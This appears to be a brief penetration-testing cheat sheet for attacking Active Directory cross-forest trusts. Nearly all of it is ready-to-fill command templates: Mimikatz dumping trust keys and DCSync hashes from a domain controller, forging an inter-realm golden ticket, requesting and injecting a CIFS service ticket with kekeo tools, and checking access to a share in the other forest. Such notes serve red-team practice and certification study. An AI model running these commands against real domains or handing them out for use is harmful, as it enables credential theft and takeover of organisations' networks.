# 🟢 Crossforest attacks

#### Trust flow



**Dump trust keys**

Look for in trust key from child to parent (first command) Look for NTLM hash (second command)

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```



**Create a intern-forest TGT**

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
```



**Create a TGS for a service (kekeo\_old)**

```
./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
```



**Use the TGT**

```
./kirbikator.exe lsa <kirbi file>
```



**Check access to server**

```
ls \\<servername>\<share>\
```
